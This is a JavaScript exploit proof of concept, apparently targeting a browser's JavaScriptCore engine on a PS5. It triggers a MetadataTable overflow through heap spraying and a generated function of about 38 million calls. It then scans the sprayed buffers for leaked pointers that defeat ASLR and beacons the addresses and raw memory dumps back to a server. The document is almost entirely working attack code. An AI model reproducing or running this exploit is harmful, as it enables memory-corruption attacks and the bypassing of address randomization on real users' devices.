// p155 — MetadataTable overflow ASLR leak (lean standalone)
//
// finishCreation writes 4.29GB forward from MetadataTable base.
// Per entry: 112 bytes. At offset 24: m_slowPathCallDestination = thunk addr (ASLR).
// MetadataTable alloc size = sizeof(LinkingData=16) + wrappedSize(100096) = 100112 bytes.
// Spray same-size buffers, free alternating, compile → scan survivors.
//
// Beacons: V155- (POST)

(function() {
  var B_PFX = 'V155-';
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = '/beacon/' + B_PFX + tag;
      if (body) u += '/' + encodeURIComponent(String(body).substring(0, 800));
      x.open('POST', u + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BS(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = '/beacon/' + B_PFX + tag;
      if (body) u += '/' + encodeURIComponent(String(body).substring(0, 800));
      x.open('POST', u + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hex8(view, off) {
    var h = '';
    for (var i = 7; i >= 0; i--) {
      var b = view[off + i];
      h += (b < 16 ? '0' : '') + b.toString(16);
    }
    return h;
  }
  function hex4(view, off) {
    var h = '';
    for (var i = 3; i >= 0; i--) {
      var b = view[off + i];
      h += (b < 16 ? '0' : '') + b.toString(16);
    }
    return h;
  }

  BS('BOOT');

  // ---- Phase 1: Spray ----
  var BUF_SZ = 100112; // sizeof(LinkingData) + wrappedSize
  var SPRAY_N = 80;
  var sprays = new Array(SPRAY_N);
  var views = new Array(SPRAY_N);

  for (var i = 0; i < SPRAY_N; i++) {
    sprays[i] = new ArrayBuffer(BUF_SZ);
    views[i] = new Uint8Array(sprays[i]);
  }
  BS('SPRAY-' + SPRAY_N);

  // ---- Phase 2: Free even-indexed to create holes ----
  var freed = 0;
  for (var i = 0; i < SPRAY_N; i += 2) {
    sprays[i] = null;
    views[i] = null;
    freed++;
  }
  BS('FREED-' + freed);

  // ---- Phase 3: Light GC pressure ----
  // Don't go crazy — just enough to trigger a collection
  for (var g = 0; g < 3; g++) {
    var tmp = [];
    for (var j = 0; j < 20000; j++) tmp.push({x: j, y: new ArrayBuffer(128)});
    tmp = null;
  }
  BS('GC-DONE');

  // Count alive
  var alive = 0;
  for (var c = 0; c < SPRAY_N; c++) {
    if (views[c]) alive++;
  }
  BS('ALIVE-' + alive);

  // ---- Phase 4: Compile 38M function ----
  var N = 38348816;
  BS('BUILD');

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(nChunks + 3);
  parts[0] = 'window.__p155fn=function(a){';
  for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
  parts[nChunks + 1] = 'a();'.repeat(rem);
  parts[nChunks + 2] = '};window.__p155ok=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    BS('COMPILED-' + (window.__p155ok ? 'OK' : 'FAIL'));
    if (window.__p155ok) setTimeout(phaseScan, 50);
    else BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = URL.createObjectURL(blob);

  // ---- Phase 5: Scan spray buffers for OOB corruption ----
  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var ptrs = [];

    // Scan odd-indexed survivors (adjacent to freed holes where MetadataTable might be)
    for (var si = 1; si < SPRAY_N; si += 2) {
      var view = views[si];
      if (!view) continue;

      // Quick check: any non-zero bytes?
      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        BS('HIT-' + si + '-nz' + nz + '-at' + firstOff);

        // Scan at 112-byte stride for thunk addresses at offset 24
        var STRIDE = 112;
        var PTR_OFF = 24;
        var maxEntries = Math.floor(view.length / STRIDE);

        for (var e = 0; e < maxEntries; e++) {
          var base = e * STRIDE;
          var ptrOff = base + PTR_OFF;
          if (ptrOff + 8 > view.length) break;

          // Read 8-byte pointer at entry + 24 (m_slowPathCallDestination)
          var lo = (view[ptrOff] | (view[ptrOff+1] << 8) | (view[ptrOff+2] << 16) | ((view[ptrOff+3] << 24) >>> 0)) >>> 0;
          var hi = (view[ptrOff+4] | (view[ptrOff+5] << 8) | (view[ptrOff+6] << 16) | ((view[ptrOff+7] << 24) >>> 0)) >>> 0;

          // Check if it looks like a kernel/user pointer (PS5: 0x0000xxxx or 0x8xxxxx)
          if (hi !== 0 && lo !== 0) {
            var hexVal = hex8(view, ptrOff);
            if (ptrs.length < 10) {
              ptrs.push(hexVal);
              B('PTR-e' + e + '-' + hexVal);
            }
          }
        }

        // Also dump first 224 bytes (2 entries) raw hex for analysis
        if (hitBufs <= 3) {
          var dump = '';
          var dumpLen = Math.min(224, view.length);
          for (var d = firstOff; d < Math.min(firstOff + dumpLen, view.length); d++) {
            var b = view[d];
            dump += (b < 16 ? '0' : '') + b.toString(16);
          }
          // Send in chunks
          for (var ch = 0; ch < dump.length; ch += 200) {
            B('DUMP-' + si + '-' + ch + '-' + dump.substring(ch, ch + 200));
          }
        }
      }
    }

    BS('HITS-' + hitBufs + '-NZ-' + totalNZ);

    if (ptrs.length > 0) {
      // We found potential pointers!
      BS('LEAK-' + ptrs.length + '-FIRST-' + ptrs[0]);

      // Also read bytecodeIndex at offset 68 (sequential, confirms it's metadata)
      for (var si2 = 1; si2 < SPRAY_N; si2 += 2) {
        var v2 = views[si2];
        if (!v2) continue;
        var hasNZ = false;
        for (var q = 0; q < 8; q++) { if (v2[q] !== 0) { hasNZ = true; break; } }
        if (!hasNZ) continue;

        // Read bytecodeIndex at first entry offset 68
        var bci = hex4(v2, 68);
        BS('BCI-' + si2 + '-' + bci);
        break;
      }
    } else if (hitBufs > 0) {
      BS('NZ-BUT-NO-PTRS');
    } else {
      BS('SPRAY-MISS');
    }

    BS('DONE');
  }
})();
